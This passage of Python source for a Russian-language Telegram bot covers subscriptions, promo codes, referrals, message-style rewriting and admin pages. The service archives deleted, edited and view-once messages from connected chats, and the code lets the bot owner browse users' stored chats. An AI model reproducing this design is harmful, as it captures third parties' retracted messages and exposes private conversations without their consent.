    "promo":   ("💯", "5341498088408234504"),
    "history": ("📊", "5231200819986047254"),
    "add":     ("➕", "5397916757333654639"),
    "warning": ("⚠️", "5447644880824181073"),
    "back":    ("➡️", "5416117059207572332"),
    "orders":  ("🛍", "5229064374403998351"),
    "profile": ("🙂", "5461117441612462242"),
}


def pe(name: str) -> str:
    """Премиум-эмодзи пака News в HTML-тексте с unicode-фолбэком."""
    fallback, emoji_id = NEWS[name]
    return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'


_ME_USERNAME: str | None = None


def bot_username() -> str:
    global _ME_USERNAME
    if BOT_USERNAME:
        return BOT_USERNAME
    if _ME_USERNAME is None:
        try:
            _ME_USERNAME = str((telegram_call("getMe") or {}).get("username") or "")
        except TelegramApiError:
            _ME_USERNAME = ""
    return _ME_USERNAME


def btn(
    text: str,
    cb: str | None = None,
    url: str | None = None,
    copy: str | None = None,
    emoji: str | None = None,
    style: str | None = None,
) -> dict:
    item: dict[str, object] = {"text": text}
    if cb:
        item["callback_data"] = cb
    if url:
        item["url"] = url
    if copy:
        # Bot API требует RichText-объект, а не голую строку
        item["copy_text"] = {"text": copy}
    if emoji:
        item["icon_custom_emoji_id"] = NEWS[emoji][1]
    if style:
        item["style"] = style
    return item


def kb(rows: list[list[dict]]) -> dict:
    return {"inline_keyboard": rows}


BACK_HOME = [btn("Назад в меню", "home", emoji="home")]

# chat_id -> до этого момента ждём «ID дней» от админа
PENDING_GRANT: dict[int, float] = {}
# chat_id -> (дни, stars|rub, срок ожидания)
PENDING_PRICE: dict[int, tuple[int, str, float]] = {}
# admin chat_id -> (scope, deadline); preview is stored after the message arrives
PENDING_BROADCAST: dict[int, tuple[str, float]] = {}
BROADCAST_PREVIEWS: dict[int, tuple[str, str, float]] = {}
PENDING_PROMO_CREATE: dict[int, float] = {}
PENDING_PROMO_ACTIVATE: dict[int, float] = {}
PENDING_GIFT: dict[int, float] = {}
PENDING_SUPPORT: dict[int, float] = {}
PENDING_SUPPORT_REPLY: dict[int, tuple[int, int, float]] = {}
PENDING_BLOCK_REASON: dict[int, tuple[int, int, float]] = {}
PENDING_ADMIN_ADD: dict[int, float] = {}
LAST_MAINTENANCE_TS = 0.0
POLLING_ERROR_COUNT = 0


def referral_link(user_id: int) -> str:
    username = bot_username() or "hollyboot_bot"
    return f"https://t.me/{username}?start=ref_{user_id}"


# --- подписка ----------------------------------------------------------------

def get_plans() -> dict[int, dict[str, int]]:
    with sqlite3.connect(DB_PATH) as conn:
        rows = conn.execute(
            "SELECT days, price_stars, price_rub FROM subscription_plans ORDER BY days"
        ).fetchall()
    return {int(days): {"stars": int(stars), "rub": int(rub)} for days, stars, rub in rows}


def get_plan(days: int) -> dict[str, int] | None:
    return get_plans().get(days)


def set_plan_price(days: int, kind: str, value: int) -> None:
    column = "price_stars" if kind == "stars" else "price_rub"
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute(
            f"UPDATE subscription_plans SET {column} = ?, updated_at = ? WHERE days = ?",
            (value, int(time.time()), days),
        )

def get_sub(user_id: int) -> tuple[int, int]:
    """(until_ts, trial_used)"""
    with sqlite3.connect(DB_PATH) as conn:
        row = conn.execute(
            "SELECT until_ts, trial_used FROM subs WHERE user_id = ?", (user_id,)
        ).fetchone()
    return (int(row[0]), int(row[1] or 0)) if row else (0, 0)


def set_until(user_id: int, until_ts: int, trial_used: int | None = None) -> None:
    now = int(time.time())
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute(
            """
            INSERT INTO subs (user_id, until_ts, trial_used, last_prompt_ts, updated_at)
            VALUES (?, ?, COALESCE(?, 0), 0, ?)
            ON CONFLICT(user_id) DO UPDATE SET
                until_ts = excluded.until_ts,
                trial_used = COALESCE(?, subs.trial_used),
                updated_at = excluded.updated_at
            """,
            (user_id, until_ts, trial_used, now, trial_used),
        )


def add_days(user_id: int, days: int) -> int:
    current, trial_used = get_sub(user_id)
    until = max(int(time.time()), current) + days * 86400
    set_until(user_id, until, trial_used)
    return until


def sub_active(user_id: int | None) -> bool:
    if user_id is None or is_admin_user(user_id):
        return True
    if is_blocked(user_id):
        return False
    return get_sub(user_id)[0] > int(time.time())


STYLE_LABELS = {
    "cute": "🎀 Няшный",
    "vasya": "🧢 Вася",
    "brother": "🤝 Брат",
    "dumb": "🧠 Тупой",
}

STYLE_EXAMPLES = {
    "cute": "приветик, ты гдеее? я уже соскучилась :3 ♡",
    "vasya": "вась, ты щас где? го потом, а то ваще дел много",
    "brother": "брат, салам. от души, давай потом спокойно решим",
    "dumb": "кароч я щас хз чо делать, типо потом разберёмся",
}

STYLE_PROTECTED_RE = re.compile(
    r"(?i)(?:https?://\S+|tg://\S+|www\.\S+|(?:t\.me|telegram\.me)/\S+|"
    r"@[a-z0-9_]{3,32}\b|\b[a-z0-9-]+(?:\.[a-z0-9-]+)+(?:/\S*)?|"
    r"(?<!\d)\+?\d[\d\s()\-]{6,}\d(?!\d))"
)


def get_communication_style(user_id: int) -> str:
    with sqlite3.connect(DB_PATH) as conn:
        row = conn.execute(
            "SELECT communication_style FROM users WHERE user_id = ?", (user_id,)
        ).fetchone()
    return str(row[0] or "") if row else ""


def set_communication_style(user_id: int, style: str) -> None:
    if style not in {"", *STYLE_LABELS}:
        raise ValueError("Неизвестный стиль общения")
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute(
            "UPDATE users SET communication_style = ?, updated_at = ? WHERE user_id = ?",
            (style, int(time.time()), user_id),
        )


def _match_case(source: str, replacement: str) -> str:
    if not source:
        return replacement
    if source.isupper():
        return replacement.upper()
    if source[0].isupper():
        return replacement[:1].upper() + replacement[1:]
    return replacement


def _replace_style_phrases(text: str, replacements: dict[str, str]) -> str:
    result = text
    # Longer phrases first so "потому что" wins over a possible "что".
    for source in sorted(replacements, key=len, reverse=True):
        target = replacements[source]
        pattern = re.compile(r"(?iu)(?<!\w)" + re.escape(source) + r"(?!\w)")
        result = pattern.sub(lambda m: _match_case(m.group(0), target), result)
    return result


def _style_plain_segment(style: str, segment: str) -> str:
    if not segment or not segment.strip():
        return segment

    if style == "cute":
        replacements = {
            "ты где": "ты гдеее",
            "доброе утро": "доброе утречко",
            "спокойной ночи": "сладких снов",
            "пожалуйста": "пожааалуйста",
            "спасибо": "спасибочки",
            "привет": "приветик",
            "здравствуй": "приветик",
            "пока": "поки",
            "хорошо": "хорошенько",
            "отлично": "суперски",
            "очень": "очень-очень",
            "люблю": "обожаю",
            "да": "ага",
            "нет": "неа",
        }
        result = _replace_style_phrases(segment, replacements)
        return re.sub(r"(?<![!?])\?(?![!?])", "??", result)

    if style == "vasya":
        replacements = {
            "потому что": "потому шо",
            "что-нибудь": "чё-нибудь",
            "что-то": "чё-то",
            "ничего": "ничё",
            "сейчас": "щас",
            "вообще": "ваще",
            "конечно": "канеш",
            "пожалуйста": "пж",
            "нормально": "норм",
            "хорошо": "норм",
            "здесь": "тут",
            "теперь": "терь",
            "что": "чё",
            "давай": "го",
        }
        result = _replace_style_phrases(segment, replacements)
        return re.sub(r"(?iu)\bне знаю\b", "хз", result)

    if style == "brother":
        replacements = {
            "большое спасибо": "от души, брат",
            "спасибо": "от души",
            "пожалуйста": "будь добр",
            "привет": "салам",
            "здравствуй": "салам",
            "хорошо": "договорились",
            "отлично": "красиво",
            "друг": "брат",
            "дружище": "брат",
            "не переживай": "не кипишуй",
            "всё нормально": "всё ровно",
        }
        return _replace_style_phrases(segment, replacements)

    replacements = {
        "потому что": "патамушта",
        "получается": "палучаеца",
        "что-нибудь": "чо-нибудь",
        "что-то": "чо-то",
        "ничего": "ничо",
        "сейчас": "щас",
        "вообще": "ваще",
        "конечно": "канешна",
        "короче": "кароч",
        "типа": "типо",
        "что": "чо",
        "зачем": "зач",
        "почему": "пачиму",
        "хорошо": "ну норм",
    }
    result = _replace_style_phrases(segment, replacements)
    result = re.sub(r"(?iu)\bя не знаю\b", "я хз", result)
    return re.sub(r"(?iu)\bне знаю\b", "хз", result)

def stylize_message_text(style: str, text: str) -> str:
    if style not in STYLE_LABELS or not text or not text.strip() or text.lstrip().startswith("/"):
        return text
    if not STYLE_PROTECTED_RE.sub("", text).strip():
        return text

    parts: list[str] = []
    last = 0
    for match in STYLE_PROTECTED_RE.finditer(text):
        parts.append(_style_plain_segment(style, text[last:match.start()]))
        parts.append(match.group(0))
        last = match.end()
    parts.append(_style_plain_segment(style, text[last:]))
    result = "".join(parts)

    # One finishing touch for the entire message, not for every fragment around
    # a protected URL/username/phone.
    stripped = result.strip()
    score = sum(map(ord, stripped)) if stripped else 0

    if style == "cute" and len(stripped) >= 8 and not re.search(r"(?i)(:3|♡|💗|🥺)\s*$", result):
        result = result.rstrip() + (" :3" if score % 2 else " ♡")
    elif style == "vasya" and len(stripped) > 18 and score % 3 == 0 and not re.match(r"(?iu)^\s*(вась|бро)\b", result):
        leading = result[: len(result) - len(result.lstrip())]
        result = leading + "вась, " + result.lstrip()
    elif style == "brother" and len(stripped) > 16 and score % 2 and not re.search(r"(?iu)\b(брат|братан|бро|родной)\b", result):
        result = result.rstrip() + ", брат"
    elif style == "dumb" and len(stripped) > 20 and score % 3 == 1 and not re.search(r"(?iu)\b(кароч|короч)\s*$", result):
        result = result.rstrip(" .") + " кароч"

    result = re.sub(r"(?:\s+:3){2,}\s*$", " :3", result)
    result = re.sub(r"(?:\s+♡){2,}\s*$", " ♡", result)
    return result

def transform_message_style(user_id: int, text: str, max_length: int = 4096) -> str:
    if not sub_active(user_id):
        return text
    style = get_communication_style(user_id)
    if not style:
        return text
    result = stylize_message_text(style, text)
    return text if not result or len(result) > max_length else result

def sub_days_left(user_id: int) -> int:
    left = get_sub(user_id)[0] - int(time.time())
    return max(0, (left + 86399) // 86400)


def format_until(until_ts: int) -> str:
    return time.strftime("%d.%m.%Y", time.localtime(until_ts)) if until_ts else "—"


def status_line(user_id: int) -> str:
    if is_admin_user(user_id):
        return f"{pe('check')} <b>бессрочная</b> (админ)"
    until, _ = get_sub(user_id)
    if until > int(time.time()):
        return f"{pe('check')} активна до <b>{format_until(until)}</b> ({sub_days_left(user_id)} дн.)"
    return f"{pe('warning')} <b>не активна</b>"


def user_exists(user_id: int) -> bool:
    with sqlite3.connect(DB_PATH) as conn:
        return conn.execute("SELECT 1 FROM users WHERE user_id = ?", (user_id,)).fetchone() is not None


def is_blocked(user_id: int) -> bool:
    if is_admin_user(user_id):
        return False
    with sqlite3.connect(DB_PATH) as conn:
        return conn.execute("SELECT 1 FROM blocked_users WHERE user_id = ?", (user_id,)).fetchone() is not None


def audit_admin(admin_id: int, action: str, target_id: int | None = None, details: str = "") -> None:
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute(
            "INSERT INTO admin_actions (admin_id, action, target_id, details, created_at) VALUES (?, ?, ?, ?, ?)",
            (admin_id, action, target_id, details[:1000], int(time.time())),
        )


def active_promo(user_id: int) -> tuple[str, int] | None:
    now = int(time.time())
    with sqlite3.connect(DB_PATH) as conn:
        row = conn.execute(
            """
            SELECT p.code, p.discount_percent
            FROM promo_activations AS a
            JOIN promo_codes AS p ON p.code = a.code
            WHERE a.user_id = ? AND p.active = 1 AND p.expires_at >= ? AND p.uses < p.max_uses
            """,
            (user_id, now),
        ).fetchone()
    return (str(row[0]), int(row[1])) if row else None


def discounted_price(user_id: int, base_price: int) -> tuple[int, str | None]:
    promo = active_promo(user_id)
    if not promo:
        return base_price, None
    code, discount = promo
    return max(1, (base_price * (100 - discount) + 99) // 100), code


def activate_promo(user_id: int, code: str) -> tuple[bool, str]:
    code = code.strip().upper()
    now = int(time.time())
    with sqlite3.connect(DB_PATH) as conn:
        row = conn.execute(
            "SELECT discount_percent, expires_at, max_uses, uses, active FROM promo_codes WHERE code = ?",
            (code,),
        ).fetchone()
        if not row or not int(row[4]) or int(row[1]) < now or int(row[3]) >= int(row[2]):
            return False, "Промокод не найден, закончился или исчерпан."
        conn.execute(
            """
            INSERT INTO promo_activations (user_id, code, activated_at) VALUES (?, ?, ?)
            ON CONFLICT(user_id) DO UPDATE SET code = excluded.code, activated_at = excluded.activated_at
            """,
            (user_id, code, now),
        )
    return True, f"Промокод {code} активирован: скидка {int(row[0])}%."


def consume_promo(user_id: int, code: str | None) -> None:
    if not code:
        return
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute(
            """
            UPDATE promo_codes SET uses = uses + 1
            WHERE code = ? AND active = 1 AND uses < max_uses AND expires_at >= ?
            """,
            (code, int(time.time())),
        )
        conn.execute("DELETE FROM promo_activations WHERE user_id = ? AND code = ?", (user_id, code))


def owner_can_log(owner_id: int | None) -> bool:
    """Есть подписка — логируем. Нет — молчим и раз в cooldown шлём напоминание."""
    if owner_id is None or sub_active(owner_id):
        return True
    now = int(time.time())
    with sqlite3.connect(DB_PATH) as conn:
        row = conn.execute("SELECT last_prompt_ts FROM subs WHERE user_id = ?", (owner_id,)).fetchone()
    last_prompt = int(row[0]) if row and row[0] else 0
    if now - last_prompt >= PROMPT_COOLDOWN_SEC:
        set_until(owner_id, get_sub(owner_id)[0], None)
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute("UPDATE subs SET last_prompt_ts = ? WHERE user_id = ?", (now, owner_id))
        text, markup = page_buy(owner_id)
        send_message(
            owner_id,
            f"{pe('warning')} <b>Подписка закончилась</b> — бот ничего не теряет "
            f"и сразу продолжит слать уведомления, как только оплатишь.\n\n{text}",
            parse_mode="HTML",
            reply_markup=markup,
        )
    return False


# --- рефералы -----------------------------------------------------------------

def ref_count(user_id: int) -> int:
    with sqlite3.connect(DB_PATH) as conn:
        row = conn.execute("SELECT COUNT(*) FROM referrals WHERE referrer_id = ?", (user_id,)).fetchone()
    return int(row[0])


def add_referral(referrer_id: int, invitee_id: int) -> bool:
    with sqlite3.connect(DB_PATH) as conn:
        cur = conn.execute(
            "INSERT OR IGNORE INTO referrals (referrer_id, invitee_id, created_at) VALUES (?, ?, ?)",
            (referrer_id, invitee_id, int(time.time())),
        )
        return cur.rowcount > 0


def check_trial(referrer_id: int) -> None:
    """Пригласил REF_REQUIRED друзей — одноразово даём REF_DAYS дней."""
    until, trial_used = get_sub(referrer_id)
    if trial_used or ref_count(referrer_id) < REF_REQUIRED:
        return
    new_until = max(int(time.time()), until) + REF_DAYS * 86400
    set_until(referrer_id, new_until, 1)
    send_message(
        get_private_chat_id(referrer_id),
        f"{pe('gift')} Ты пригласил(а) {REF_REQUIRED} друзей — лови пробную подписку "
        f"на <b>{REF_DAYS} дня</b> (до {format_until(new_until)}).\n"
        f"Закончится — продли в меню: {pe('stars')} «Купить подписку».",
        parse_mode="HTML",
    )


# --- страницы меню ------------------------------------------------------------

def bottom_navigation() -> list[list[dict]]:
    """One stable navigation strip shown under every personal menu screen."""
    return [
        [btn("🏠 Главное меню", "home"), btn("⭐ Моя подписка", "buy")],
        [btn("🎭 Стиль общения", "style"), btn("💬 Поддержка", "support")],
        [btn("👥 Пригласить друзей", "ref")],
    ]

def page_home(user_id: int) -> tuple[str, dict]:
    rows = [
        [btn("🔗 Подключить чаты", "conns")],
        [
            btn("❓ Как это работает", "help"),
        ],
    ]
    rows.extend(bottom_navigation())
    if is_admin_user(user_id):
        rows.append([btn("Админ-панель", "panel", emoji="admin")])

    text = (
        f"{pe('home')} <b>Holly Bot</b>\n\n"
        "Сохраняю важные сообщения из твоих чатов и присылаю их сюда, "
        "если их удалили или изменили. Фото, видео и голосовые тоже попадают в архив.\n\n"
        f"{pe('check')} Удалённые и изменённые сообщения\n"
        f"{pe('check')} Одноразовые фото и видео\n"
        f"{pe('check')} Стиль общения — внутри подписки\n\n"
        f"{pe('stars')} <b>Подписка:</b> {status_line(user_id)}\n\n"
        "Начни с кнопки «⭐ Моя подписка» или подключи нужные чаты."
    )
    return text, kb(rows)

def page_buy(user_id: int) -> tuple[str, dict]:
    plans = get_plans()
    p15, p30 = plans[15], plans[30]
    p15_rub, _ = discounted_price(user_id, p15["rub"])
    p15_stars, _ = discounted_price(user_id, p15["stars"])
    p30_rub, _ = discounted_price(user_id, p30["rub"])
    p30_stars, _ = discounted_price(user_id, p30["stars"])
    promo = active_promo(user_id)
    gift_link = f"https://t.me/{bot_username() or 'hollyboot_bot'}?start=gift_{user_id}"
    promo_text = f"\nПромокод: <b>{html_text(promo[0])}</b> (скидка {promo[1]}%)\n" if promo else ""
    active = sub_active(user_id)
    action = "Продлить" if active else "Купить"
    heading = "Моя подписка" if active else "Подписка Holly Bot"
    text = (
        f"{pe('stars')} <b>{heading}</b>\n\n"
        f"{status_line(user_id)}\n\n"
        "В подписку входит:\n"
        f"{pe('check')} сохранение удалённых и изменённых сообщений\n"
        f"{pe('check')} архив фото, видео и голосовых\n"
        f"{pe('check')} 🎭 стиль общения для исходящих сообщений\n\n"
        f"{promo_text}"
        f"<b>{action} на 15 дней</b> — {p15_rub} ₽ или {p15_stars} ⭐\n"
        f"<b>{action} на 30 дней</b> — {p30_rub} ₽ или {p30_stars} ⭐\n\n"
        f"Выбери способ оплаты — подписка {('продлится' if active else 'активируется')} сразу после подтверждения.\n"
        f"Можно получить {REF_DAYS} дня бесплатно: пригласи {REF_REQUIRED} друзей."
    )
    rows = [
        [
            btn(f"{action} на 15 дней · {p15_rub} ₽", "buy:sbp:15", style="success"),
            btn(f"{action} на 15 дней · {p15_stars} ⭐", "buy:stars:15", style="success"),
        ],
        [
            btn(f"{action} на 30 дней · {p30_rub} ₽", "buy:sbp:30", style="success"),
            btn(f"{action} на 30 дней · {p30_stars} ⭐", "buy:stars:30", style="success"),
        ],
        [
            btn("🎟 Ввести промокод", "promo:activate"),
            btn("🎁 Подарить подписку", "gift:start"),
        ],
        [btn("🔗 Моя ссылка для подарка", copy=gift_link)],
    ]
    rows.extend(bottom_navigation())
    return text, kb(rows)


def page_communication_style(user_id: int) -> tuple[str, dict]:
    current = get_communication_style(user_id)
    current_label = STYLE_LABELS.get(current, "🚫 Отключён")
    rows = [
        [
            btn(("✓ " if current == "cute" else "") + "🎀 Няшный", "style:cute"),
            btn(("✓ " if current == "vasya" else "") + "🧢 Вася", "style:vasya"),
        ],
        [
            btn(("✓ " if current == "brother" else "") + "🤝 Брат", "style:brother"),
            btn(("✓ " if current == "dumb" else "") + "🧠 Тупой", "style:dumb"),
        ],
        [btn("🚫 Отключить стиль", "style:off", style="danger")],
    ]
    rows.extend(bottom_navigation())
    examples = "\n".join(
        f"{'→' if key == current else '•'} <b>{label}</b>: {html_text(STYLE_EXAMPLES[key])}"
        for key, label in STYLE_LABELS.items()
    )
    text = (
        "🎭 <b>Стиль общения</b>\n\n"
        f"Сейчас: <b>{current_label}</b>\n\n"
        "Теперь стиль меняет не только первое или последнее слово: бот перерабатывает "
        "слова и фразы по всему сообщению. Ссылки, @username и номера телефонов не трогаются.\n\n"
        f"<b>Примеры:</b>\n{examples}"
    )
    return text, kb(rows)

def page_ref(user_id: int) -> tuple[str, dict]:
    link = referral_link(user_id)
    count = ref_count(user_id)
    _, trial_used = get_sub(user_id)
    progress = "·".join("●" if i < min(count, REF_REQUIRED) else "○" for i in range(REF_REQUIRED))
    trial_note = (
        f"{pe('check')} пробная уже активирована"
        if trial_used
        else f"{pe('gift')} за {REF_REQUIRED} приглашённых — {REF_DAYS} дня бесплатно"
    )
    text = (
        f"{pe('invite')} <b>Пригласи друзей</b>\n\n"
        f"Твоя ссылка:\n<code>{link}</code>\n\n"
        f"Приглашено: <b>{count}</b>\n"
        f"Прогресс: {progress} ({min(count, REF_REQUIRED)}/{REF_REQUIRED})\n"
        f"{trial_note}\n\n"
        f"Друг открывает ссылку и нажимает /start — приглашение засчитается."
    )
    rows = [
        [btn("📋 Скопировать ссылку", copy=link, style="primary")],
        [btn("↗️ Поделиться", url=f"https://t.me/share/url?url={quote(link, safe='')}&text=Хочу%20попробовать%20Holly%20Bot")],
    ]
    rows.extend(bottom_navigation())
    return text, kb(rows)


def page_help(user_id: int) -> tuple[str, dict]:
    username = bot_username()
    text = (
        f"{pe('support')} <b>Как работает Holly Bot</b>\n\n"
        "Бот хранит копии сообщений из выбранных чатов. Если сообщение удалят или изменят, "
        "ты получишь его здесь вместе с фото, видео или голосовым.\n\n"
        "<b>Как подключить чаты</b>\n"
        "1. Открой Telegram → Настройки → Telegram Business\n"
        "2. Выбери «Чат-боты» и добавь бота\n"
        f"3. Найди <code>@{username}</code>\n"
        "4. Отметь нужные чаты и сохрани\n\n"
        "Для обычной группы добавь бота администратором и напиши <code>/watch</code>.\n\n"
        "Подписка открывает сохранение сообщений и 🎭 стиль общения."
    )
    rows = [
        [btn("🔗 Проверить подключение", "conns")],
        [btn("⭐ Открыть подписку", "buy", style="success")],
    ]
    rows.extend(bottom_navigation())
    return text, kb(rows)

def page_connections(user_id: int) -> tuple[str, dict]:
    rows = list_business_connections(user_id)
    if rows:
        enabled = sum(1 for row in rows if row.get("is_enabled"))
        disabled = len(rows) - enabled
        text = (
            f"{pe('view')} <b>Подключение чатов</b>\n\n"
            f"✅ Защищённых чатов: <b>{enabled}</b>\n"
            f"⏸ Приостановлено: <b>{disabled}</b>\n\n"
            "Бот будет присылать сюда удалённые и изменённые сообщения, "
            "а также сохранённые медиа."
        )
    else:
        text = (
            f"{pe('view')} <b>Чаты пока не подключены</b>\n\n"
            "Подключи нужные чаты в Telegram Business — после этого бот будет "
            "сохранять удалённые, изменённые и одноразовые сообщения."
        )
    action_rows = []
    if rows and any(not row.get("is_enabled") for row in rows):
        action_rows.append([btn("✅ Включить приостановленные", "restore", emoji="check")])
    action_rows.extend([
        [btn("❓ Как подключить", "help")],
        [btn("🔄 Проверить статус", "conns")],
    ])
    action_rows.extend(bottom_navigation())
    markup = kb(action_rows)
    return text, markup

USERS_PAGE_SIZE = 15
ADMIN_CHATS_PAGE_SIZE = 10
ADMIN_MESSAGES_PAGE_SIZE = 10

OWNER_MESSAGES_FROM = """
    FROM messages AS m
    LEFT JOIN chat_owners AS co
      ON m.context = 'regular' AND co.chat_id = m.chat_id
    LEFT JOIN business_connections AS bc
      ON m.context = 'business:' || bc.connection_id
    WHERE (co.owner_id = ? OR bc.owner_id = ?)
"""

ADMIN_MEDIA_LABELS = {
    "photo": "🖼 Фото",
    "video": "🎬 Видео",
    "voice": "🎤 ГС",
    "video_note": "⭕ Кружок",
    "sticker": "🏷 Стикер",
}
def stored_user_label(
    user_id: int,
    first_name: str | None,
    last_name: str | None,
    username: str | None,
) -> str:
    name = " ".join(part for part in (first_name, last_name) if part).strip()
    if username:
        mention = f"@{html_text(username)}"
        return f"{html_text(name)} ({mention})" if name else mention
    return html_text(name) if name else f"Пользователь {user_id}"


def stored_user_payment_label(user_id: int) -> str:
    with sqlite3.connect(DB_PATH) as conn:
        row = conn.execute(
            "SELECT first_name, last_name, username FROM users WHERE user_id = ?",
            (user_id,),
        ).fetchone()
    label = stored_user_label(user_id, *(row or (None, None, None)))
    return f"{label}\nID: <code>{user_id}</code>"


def chat_participant_label(author: str | None, user_id: int | None = None) -> str:
    raw = str(author or "").strip()
    username = re.search(r"@[A-Za-z0-9_]{3,}", raw)
    if username:
        return username.group(0)
    name = raw.split(" (", 1)[0].strip()
    return name or (f"Пользователь {user_id}" if user_id else "Собеседник")


def page_users(user_id: int, page_number: int = 0) -> tuple[str, dict]:
    if not is_admin_user(user_id):
        return "Эта страница доступна только администраторам.", kb([BACK_HOME])

    with sqlite3.connect(DB_PATH) as conn:
        total = int(conn.execute("SELECT COUNT(*) FROM users").fetchone()[0])
        page_count = max(1, (total + USERS_PAGE_SIZE - 1) // USERS_PAGE_SIZE)
        page_number = min(max(0, page_number), page_count - 1)
        rows = conn.execute(
            """
            SELECT u.user_id, u.first_name, u.last_name, u.username,
                   u.created_at, u.updated_at, COALESCE(s.until_ts, 0)
            FROM users AS u
            LEFT JOIN subs AS s ON s.user_id = u.user_id
            ORDER BY u.updated_at DESC, u.user_id DESC
            LIMIT ? OFFSET ?
            """,
            (USERS_PAGE_SIZE, page_number * USERS_PAGE_SIZE),
        ).fetchall()

    lines = []
    for index, row in enumerate(rows, start=page_number * USERS_PAGE_SIZE + 1):
        uid, first_name, last_name, username, created_at, updated_at, until_ts = row
        if is_admin_user(int(uid)):
            subscription = "бессрочная (админ)"
        elif int(until_ts or 0) > int(time.time()):
            subscription = f"до {format_until(int(until_ts))}"
        else:
            subscription = "нет"
        lines.append(
            f"<b>{index}.</b> {stored_user_label(int(uid), first_name, last_name, username)}\n"
            f"ID: <code>{uid}</code> · подписка: <b>{subscription}</b> · "
            f"заходил: {time.strftime('%d.%m.%Y', time.localtime(int(updated_at or created_at)))}"
        )

    body = "\n\n".join(lines) if lines else "Пользователей пока нет."
    text = (
        f"{pe('view')} <b>Все пользователи</b>\n"
        f"Всего: <b>{total}</b> · страница {page_number + 1}/{page_count}\n\n{body}"
    )
    navigation: list[dict] = []
    if page_number > 0:
        navigation.append(btn("Назад", f"users:{page_number - 1}", emoji="home"))
    if page_number + 1 < page_count:
        navigation.append(btn("Дальше", f"users:{page_number + 1}", emoji="view"))
    buttons: list[list[dict]] = []
    for row in rows:
        uid, first_name, last_name, username, *_ = row
        short_name = f"@{username}" if username else (first_name or str(uid))
        buttons.append([btn(f"{short_name} · {uid}", f"user:{uid}:{page_number}", emoji="view")])
    if navigation:
        buttons.append(navigation)
    buttons.extend([[btn("Обновить", f"users:{page_number}", emoji="refresh")], [btn("Админ-панель", "panel", emoji="admin")], BACK_HOME])
    return text, kb(buttons)


def page_user_card(admin_id: int, target_id: int, return_page: int = 0) -> tuple[str, dict]:
    if not is_admin_user(admin_id):
        return "Эта страница доступна только администраторам.", kb([BACK_HOME])
    with sqlite3.connect(DB_PATH) as conn:
        user = conn.execute(
            "SELECT first_name, last_name, username, created_at, updated_at FROM users WHERE user_id = ?",
            (target_id,),
        ).fetchone()
        stars = conn.execute(
            "SELECT COUNT(*), COALESCE(SUM(stars), 0) FROM payments WHERE user_id = ?", (target_id,)
        ).fetchone()
        rub = conn.execute(
            "SELECT COUNT(*), COALESCE(SUM(rub), 0) FROM sbp_payments WHERE user_id = ? AND status = 'paid'",
            (target_id,),
        ).fetchone()
        regular_chats = conn.execute("SELECT COUNT(*) FROM chat_owners WHERE owner_id = ?", (target_id,)).fetchone()[0]
        business_chats = conn.execute("SELECT COUNT(*) FROM business_connections WHERE owner_id = ?", (target_id,)).fetchone()[0]
        blocked = conn.execute("SELECT reason FROM blocked_users WHERE user_id = ?", (target_id,)).fetchone()
        history = conn.execute(
            """
            SELECT method, days, amount, created_at FROM (
                SELECT 'Stars' AS method, days, stars AS amount, created_at FROM payments WHERE user_id = ?
                UNION ALL
                SELECT 'СБП', days, rub, COALESCE(paid_at, created_at) FROM sbp_payments
                WHERE user_id = ? AND status = 'paid'
            ) ORDER BY created_at DESC LIMIT 5
            """,
            (target_id, target_id),
        ).fetchall()
    if not user:
        return "Пользователь не найден.", kb([[btn("Назад", f"users:{return_page}", emoji="home")]])
    until, _ = get_sub(target_id)
    history_text = "\n".join(
        f"• {method}: {days} дн., {amount} {'⭐' if method == 'Stars' else '₽'} — {time.strftime('%d.%m.%Y', time.localtime(created))}"
        for method, days, amount, created in history
    ) or "покупок нет"
    text = (
        f"{pe('view')} <b>Карточка пользователя</b>\n\n"
        f"{stored_user_label(target_id, user[0], user[1], user[2])}\n"
        f"ID: <code>{target_id}</code>\n"
        f"Подписка: <b>{'до ' + format_until(until) if until > int(time.time()) else 'нет'}</b>\n"
        f"Статус: <b>{'заблокирован' if blocked else 'активен'}</b>"
        f"{f' ({html_text(blocked[0])})' if blocked and blocked[0] else ''}\n"
        f"Подключений: <b>{int(regular_chats) + int(business_chats)}</b> "
        f"(обычных {regular_chats}, Business {business_chats})\n"
        f"Рефералов: <b>{ref_count(target_id)}</b>\n"
        f"Покупок: <b>{stars[0]}</b> на {stars[1]} ⭐, <b>{rub[0]}</b> на {rub[1]} ₽\n\n"
        f"<b>Последние покупки:</b>\n{history_text}"
    )
    block_button = btn("Разблокировать", f"unblock:{target_id}:{return_page}", emoji="check", style="success") if blocked else btn("Заблокировать", f"block:{target_id}:{return_page}", emoji="warning", style="danger")
    rows = [
        [btn("+15 дней", f"useradd:{target_id}:15:{return_page}", emoji="add"), btn("+30 дней", f"useradd:{target_id}:30:{return_page}", emoji="add")],
        [block_button],
        [btn("Назад к пользователям", f"users:{return_page}", emoji="home")],
        BACK_HOME,
    ]
    if is_owner_admin(admin_id) and target_id not in CHAT_VIEW_BLOCKED_USER_IDS:
        rows.insert(0, [btn("Чаты пользователя", f"uchats:{target_id}:{return_page}:0", emoji="view")])
    return text, kb(rows)


def page_user_chats(admin_id: int, target_id: int, return_page: int = 0, page_number: int = 0) -> tuple[str, dict]:
    if not is_owner_admin(admin_id) or target_id in CHAT_VIEW_BLOCKED_USER_IDS:
        return "Эта страница доступна только владельцу бота.", kb([BACK_HOME])
    with sqlite3.connect(DB_PATH) as conn:
        target_user = conn.execute(
            "SELECT first_name, last_name, username FROM users WHERE user_id = ?",
            (target_id,),
        ).fetchone()
        total = int(conn.execute(
            "SELECT COUNT(DISTINCT m.chat_id) " + OWNER_MESSAGES_FROM,
            (target_id, target_id),
        ).fetchone()[0])
        page_count = max(1, (total + ADMIN_CHATS_PAGE_SIZE - 1) // ADMIN_CHATS_PAGE_SIZE)
        page_number = min(max(0, page_number), page_count - 1)
        chats = conn.execute(
            """
            SELECT m.chat_id, COUNT(*), COUNT(DISTINCT m.user_id), MAX(m.updated_at),
                   COALESCE(MAX(CASE WHEN m.user_id != ? THEN m.author END), MAX(m.author))
            """ + OWNER_MESSAGES_FROM + """
            GROUP BY m.chat_id
            ORDER BY MAX(m.updated_at) DESC
            LIMIT ? OFFSET ?
            """,
